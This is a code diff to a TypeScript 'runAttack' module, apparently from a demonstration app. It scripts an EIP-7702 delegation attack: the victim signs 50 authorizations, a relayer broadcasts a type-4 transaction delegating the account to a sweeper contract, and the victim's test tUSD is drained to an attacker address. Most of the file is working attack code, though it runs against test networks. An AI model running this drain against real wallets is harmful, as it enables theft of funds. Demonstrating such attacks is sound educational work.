@@ -1,23 +1,27 @@
-import { formatUnits, encodeFunctionData, keccak256, type Hex } from "viem";
+import { formatUnits, encodeFunctionData, keccak256, createPublicClient, createWalletClient, http, defineChain, type Hex } from "viem";
 import { privateKeyToAccount } from "viem/accounts";
-import { publicClient, walletClient, getChain } from "./chain";
-import { getConfig } from "./runtime";
 import { ERC20_ABI, SWEEPER_ABI } from "./abi";
 import { arkivEnabled, recordDelegation, upsertDelegate } from "./arkiv";
+import { chainConfig, WHITECHAIN_ID } from "./chains";
 import type { Emit } from "./types";
 
 const NUM_AUTHS = 50;
 const DEC = 6;
 
-// Real attack on anvil finishes in ~100ms — too fast to watch. Pace the stream so the
+// Real attack on anvil finishes in ~100ms, too fast to watch. Pace the stream so the
 // sequence is presentable. The on-chain actions are unchanged; only the emit cadence is paced.
 // Set ATTACK_PACE_MS=0 to disable (e.g. on Sepolia, where block times pace it naturally).
 const PACE = Number(process.env.ATTACK_PACE_MS ?? 26);
 const sleep = (ms: number) => (ms > 0 ? new Promise((r) => setTimeout(r, ms)) : Promise.resolve());
 
+// Each of the four drain steps should stay on screen long enough to follow, even when the real
+// on-chain action finishes in milliseconds. Hold every step for at least this long before moving on.
+// Set ATTACK_MIN_STEP_MS=0 to disable (e.g. to run flat-out).
+const MIN_STEP_MS = Number(process.env.ATTACK_MIN_STEP_MS ?? 4000);
+
 function env(k: string) {
   const v = process.env[k];
-  if (!v) throw new Error(`Missing ${k} — run \`npm run setup\` (local) or configure .env (Sepolia).`);
+  if (!v) throw new Error(`Missing ${k}, run \`npm run setup\` (local) or configure .env (Sepolia).`);
   return v;
 }
 
@@ -29,19 +33,39 @@ function env(k: string) {
  * (the Deposit button). The relayer pays gas and broadcasts; the attacker +
  * contracts come from `npm run setup` / deploy.
  */
-export async function runAttack(emit: Emit) {
+export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: number) {
   const E = (e: Parameters<Emit>[0]) => emit({ t: Date.now(), ...e });
+  const abortIf = () => { if (signal?.aborted) throw new DOMException("aborted", "AbortError"); };
 
-  const chain = getChain();
-  const cfg = getConfig(); // current run's addresses (swapped by /api/reset)
+  // Keep each drain step live for at least MIN_STEP_MS. Call holdStep() right before starting the
+  // next step: it waits out the remainder of the current step's minimum, then marks the new step's
+  // start. The on-chain work already done during a step counts toward its minimum, so a slow step
+  // (e.g. a real Sepolia block) waits nothing extra.
+  let stepAt = 0;
+  const holdStep = async () => {
+    if (stepAt) {
+      const remaining = MIN_STEP_MS - (Date.now() - stepAt);
+      if (remaining > 0) { abortIf(); await sleep(remaining); }
+    }
+    stepAt = Date.now();
+  };
+
+  // Per-network selection; unknown/omitted chain -> Whitechain. Contracts (token/sweeper/attacker)
+  // come from the registry; the relayer and victim keys are shared across networks (from env).
+  const net = chainConfig(chainId);
+  const chain = defineChain({
+    id: net.id, name: net.name,
+    nativeCurrency: net.id === WHITECHAIN_ID ? { name: "WhiteBIT Coin", symbol: "WBT", decimals: 18 } : { name: "Ether", symbol: "ETH", decimals: 18 },
+    rpcUrls: { default: { http: [net.rpc] } },
+  });
   const relayer = privateKeyToAccount(env("RELAYER_PK") as `0x${string}`);
-  const attacker = cfg.attacker;
-  const sweeper = cfg.sweeper;
-  const tusd = cfg.tusd;
-  const victim = privateKeyToAccount(cfg.victimPk); // fixed victim (persistent on-chain balance)
+  const victim = privateKeyToAccount(env("VICTIM_PK") as `0x${string}`); // fixed victim (persistent per chain)
+  const attacker = net.attacker;
+  const sweeper = net.sweeper;
+  const tusd = net.token;
 
-  const pub = publicClient();
-  const wallet = walletClient(relayer);
+  const pub = createPublicClient({ chain, transport: http(net.rpc) });
+  const wallet = createWalletClient({ account: relayer, chain, transport: http(net.rpc) });
 
   E({ step: "setup", msg: "Actors loaded", victim: victim.address, relayer: relayer.address, attacker, sweeper, tusd });
 
@@ -50,13 +74,15 @@ export async function runAttack(emit: Emit) {
   // nothing to drain, so stop early and tell the user to top up first.
   const before = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
   if (before === 0n) {
-    E({ step: "empty", msg: "The wallet is empty — press Deposit to add test tUSD, then launch the attack." });
+    E({ step: "empty", msg: "The wallet is empty, press Deposit to add test tUSD, then launch the attack." });
     return;
   }
   E({ step: "before", msg: "Victim balance before attack", victimTUSD: formatUnits(before, DEC), attackerTUSD: "0" });
+  abortIf();
 
-  // 1 — sign 50 authorizations at consecutive nonces
+  // 1, sign 50 authorizations at consecutive nonces
   const start = await pub.getTransactionCount({ address: victim.address });
+  await holdStep(); // step 1 begins
   E({ step: "sign", msg: `Victim current nonce is ${start}. Signing ${NUM_AUTHS} authorizations at nonces ${start}..${start + NUM_AUTHS - 1}`, victimNonce: start, numAuths: NUM_AUTHS });
   const auths = [];
   for (let i = 0; i < NUM_AUTHS; i++) {
@@ -65,27 +91,38 @@ export async function runAttack(emit: Emit) {
     await sleep(PACE);
   }
   E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
-  await sleep(PACE * 14);
+  abortIf();
 
-  // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
+  // 2, relayer broadcasts the delegation (victim nonce only advances via the authorization)
+  await holdStep(); // step 2 begins (step 1 held ≥ MIN_STEP_MS)
   E({ step: "delegate", msg: "Relayer broadcasting type-4 transaction carrying all 50 authorizations..." });
   const dHash = await wallet.sendTransaction({ authorizationList: auths, to: victim.address, data: "0x" });
   E({ step: "delegate-sent", msg: "Delegation tx sent", txHash: dHash });
   const dRc = await pub.waitForTransactionReceipt({ hash: dHash });
   E({ step: "delegate-mined", msg: "Delegation mined", block: Number(dRc.blockNumber), status: dRc.status });
 
-  const code = await pub.getCode({ address: victim.address });
-  const delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  // Poll getCode until the read RPC reflects the delegation, public RPCs are eventually consistent,
+  // so a confirmed receipt doesn't mean the next getCode shows the new code.
+  let code = await pub.getCode({ address: victim.address });
+  let delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  for (let i = 0; i < 12 && !delegated; i++) {
+    await sleep(1500);
+    code = await pub.getCode({ address: victim.address });
+    delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  }
+  await holdStep(); // step 3 begins (step 2 held ≥ MIN_STEP_MS)
   E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
   if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
-  await sleep(PACE * 14);
+  abortIf();
 
-  // 3 — drain
+  // 3, drain
+  await holdStep(); // step 4 begins (step 3 held ≥ MIN_STEP_MS)
   E({ step: "sweep", msg: "Calling sweeper to drain victim tUSD to attacker..." });
   const sData = encodeFunctionData({ abi: SWEEPER_ABI, functionName: "sweepToken", args: [tusd] });
   const sHash = await wallet.sendTransaction({ to: victim.address, data: sData });
   E({ step: "sweep-sent", msg: "Sweep tx sent", txHash: sHash });
   const sRc = await pub.waitForTransactionReceipt({ hash: sHash });
+  await holdStep(); // keep step 4 (the drain) live for ≥ MIN_STEP_MS before it resolves
   E({ step: "sweep-mined", msg: "Sweep mined", block: Number(sRc.blockNumber), status: sRc.status });
 
   const after = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
